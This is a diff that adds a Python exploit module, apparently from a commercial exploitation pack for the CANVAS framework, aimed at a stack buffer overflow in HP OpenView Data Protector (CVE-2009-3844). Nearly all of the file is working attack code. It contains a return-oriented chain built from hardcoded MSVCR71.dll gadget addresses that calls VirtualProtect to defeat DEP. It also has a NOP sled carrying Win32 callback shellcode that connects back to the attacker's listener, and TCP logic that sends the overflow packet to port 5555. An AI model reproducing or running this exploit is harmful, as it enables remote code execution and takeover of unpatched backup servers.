@@ -1,0 +1,267 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+
+# GUI info
+NAME = "HP OpenView Data Protector Recovery Manager Stack Buffer Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in HP OpenView Data Protector Recovery Manager"
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = "HP"
+DOCUMENTATION["Repeatability"] = "One time"
+DOCUMENTATION["Date public"] = "2009.12.08"
+DOCUMENTATION["References"] = "http://zerodayinitiative.com/advisories/ZDI-09-091/"
+DOCUMENTATION["Versions Affected"] = "HP DP < 6.1"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2009-3844"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3844"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2003" ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "HP DP 6.0 (DEP)"],  
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.badstring = "\x00"
+        self.name = NAME       
+        self.port = 5555
+        self.ssl = 0
+        self.version = 0
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        return self.createWin32Shellcode(self.badstring, self.callback.ip, self.callback.port)                  
+
+
+    def run(self):
+        # Check arguments
+        self.host = self.target.interface                
+        self.port = int(self.argsDict.get("port", self.port))
+                        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+        s.send(sploitstring)        
+        
+        ret = self.ISucceeded()
+        
+        if not ret:
+            self.log("Sleeping for two seconds to check for callback")
+            time.sleep(2)
+            ret = self.ISucceeded()        
+        
+        if ret:
+            self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+            self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):				
+        ## C:\Program Files\OmniBack\bin\MSVCR71.dll ##			
+        VirtualProtect = struct.pack('<L', 0x7c3528dd) ## CALL DWORD PTR DS:[<&KERNEL32.VirtualPro>; kernel32.VirtualProtect # LEA ESP,DWORD PTR SS:[EBP-58] # POP EDI #  POP ESI # POP EBX # LEAVE # RETN
+        lpAddress = "XXXX"                             ## shellcode address
+        dwSize = "YYYY"                                ## shellcode size
+        flNewProtect = "ZZZZ"                          ## PAGE_EXECUTE_READWRITE (0x40)
+        lpflOldProtect = struct.pack('<L', 0x7c38b660) ## writeable address  
+        
+        i01 = struct.pack('<L', 0x7c347460) ## PUSH ESP # AND AL,0C # NEG EDX # NEG EAX # SBB EDX,0 # POP EBX # RETN 10
+        i02 = struct.pack('<L', 0x7c34f6c2) ## MOV EAX,EBX # POP EBX # RETN
+        i03 = struct.pack('<L', 0x7c343427) ## MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 10
+        i04 = struct.pack('<L', 0x7c359bfe) ## ADD ESP,20 # RETN
+        i05 = struct.pack('<L', 0x7c3522b4) ## ADD EAX,20 # RETN
+        i06 = struct.pack('<L', 0x7c3503c8) ## MOV DWORD PTR DS:[ECX],EAX # RETN
+        i07 = struct.pack('<L', 0x7c35a3b3) ## INC ECX # MOV DWORD PTR DS:[7C3914B8],ECX # RETN
+        i08 = struct.pack('<L', 0x7c34115e) ## XOR EAX,EAX # RETN
+        i09 = struct.pack('<L', 0x7c341da1) ## DEC EAX # RETN
+        i10 = struct.pack('<L', 0x7c341f0a) ## MOV ESP,ECX # MOV ECX,DWORD PTR DS:[EAX] # MOV EAX,DWORD PTR DS:[EAX+4] # PUSH EAX # RETN
+        i11 = struct.pack('<L', 0x7c3410fd) ## POP EBP # RETN
+        i12 = struct.pack('<L', 0x7c3554e3) ## SUB EAX,20 # RETN
+        i13 = struct.pack('<L', 0x7c359f5a) ## MOV EAX,ECX # RETN
+        nop = struct.pack('<L', 0x7c3527c9) ## XOR EDI,EDI # RETN
+        jmp = struct.pack('<L', 0x7c3418d9) ## CALL EAX
+        			
+        ## Save esp
+        # push esp 
+        # pop ebx
+        dep  = i01
+        # mov eax,ebx 
+        dep += i02 + "\xFF\xFF\xFF\xFF" * 0x5
+        # mov ecx,eax
+        dep += i03 + "\xFF\xFF\xFF\xFF"
+        # mov eax, ecx
+        dep += i13 + "\xFF\xFF\xFF\xFF" * 0x4
+        
+        ## Set first parameter value
+        # add esp,0x20
+        dep += i04 + "\xFF\xFF\xFF\xFF" * 0x3
+        # VirtualProtect
+        dep += VirtualProtect + lpAddress + dwSize + flNewProtect + lpflOldProtect
+        # add eax,0x20
+        dep += i05 * 0x1e
+        # inc ecx
+        dep += i07 * 0x48
+        
+        ## Write first parameter with shellcode address
+        # mov [ecx],eax  
+        dep += i06
+        
+        ## Set second parameter value
+        # xor eax,eax
+        dep += i08
+        # add eax,0x20
+        dep += i05 * 0x28
+        # inc ecx
+        dep += i07 * 0x4
+        
+        ## Write second parameter with shellcode size
+        # mov [ecx],eax  
+        dep += i06
+        
+        ## Set third parameter value
+        # xor eax,eax
+        dep += i08
+        # add eax,0x20
+        dep += i05 * 0x2
+        # inc ecx
+        dep += i07 * 0x4
+        
+        ## Write third parameter with PAGE_EXECUTE_READWRITE (0x40)
+        # mov [ecx],eax  
+        dep += i06
+        
+        ## Set ebp with shellcode address to pass LEAVE after the VirtualProtect
+        # mov eax,ecx
+        dep += i13
+        # add eax,0x20
+        dep += i05 * 0x1a
+        # dec eax
+        dep += i09 * 0x4
+        # nop
+        dep += nop
+        # mov ecx,eax
+        dep += i03 + "\xFF\xFF\xFF\xFF"
+        # mov eax, ecx
+        dep += i13 + "\xFF\xFF\xFF\xFF" * 0x4
+        # add eax,0x20
+        dep += i05 * 0x7
+        # mov [ecx],eax
+        dep += i06
+        # pop ebp
+        dep += i11 + "XXXX"
+        
+        ## Restore esp with VirtualProtect address on the stack
+        # mov eax,ecx
+        dep += i13
+        # sub eax,0x20
+        dep += i12 * 0x1a
+        # dec eax
+        dep += i09 * 0x4
+        # mov ecx,eax
+        dep += i03 + "\xFF\xFF\xFF\xFF"
+        # mov eax, ecx
+        dep += i13 + "\xFF\xFF\xFF\xFF" * 0x4
+        # dec eax
+        dep += i09 * 0x8
+        
+        ## Execute VirtualProtect
+        # mov esp, ecx
+        dep += i10 
+        # padding
+        dep += "\x90\x90\x90\x90" * 0x9
+        
+        ## Set eax with esp for call eax
+        # push esp 
+        # pop ebx
+        dep += i01
+        # mov eax,ebx 
+        dep += i02 + "\xFF\xFF\xFF\xFF" * 0x5
+        # add eax,0x20
+        dep += i05
+        
+        ## Jmp on the shellcode
+        # call eax 
+        dep += jmp
+        
+        payload = "\x90"*0x600
+        print len(self.shellcode)
+        print len(payload)
+        payload = payload[:8] + self.shellcode + payload[8+len(self.shellcode):]
+        print len(payload)
+        
+        sep = struct.pack(">L", 0x2000)
+        data  = "\xff\xfe"
+        data += "\x32\x00\x36\x00\x37\x00"
+        data += sep + "AA" +  sep + "AA" + sep + "AA" + sep + "A"*0x254 + "\xff\xff\xff\xff" + "A"*0x550 + dep + payload + sep + "B"*0x5 + sep + "aaaa" + sep + "\x11\x00\x22\x00\x11\x00\x22\x00" + sep
+        sploitstring = struct.pack(">L", len(data)) + data
+	
+        return sploitstring
+      
+        		
+    def displayVersions(self):
+        i = 0
+        print 'Available versions:'
+        for listline in targets.values():
+            print "\t%d: %s" % (i,listline[0])
+            i += 1
+
+
+    def usage(self):
+        print "Usage: %s -v version -t targethost -p port -l localip -d localport\n" % (sys.argv[0])
+        self.displayVersions()
+        sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
